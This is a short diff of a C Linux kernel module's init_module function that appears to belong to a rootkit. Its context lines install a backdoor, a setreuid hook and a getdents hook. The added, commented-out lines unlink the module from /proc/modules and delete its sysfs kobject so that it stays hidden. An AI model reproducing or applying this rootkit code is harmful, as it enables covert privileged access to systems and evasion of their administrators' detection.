@@ -628,6 +628,10 @@ int init_module(void) {
 		return 1;
 	}
 
+	//hide module from /proc/modules and /sys/module respectively
+	//list_del_init(&__this_module.list);
+	//kobject_del(&THIS_MODULE->mkobj.kobj);
+
 	add_backdoor();
 	add_setreuid();
 	add_getdents();
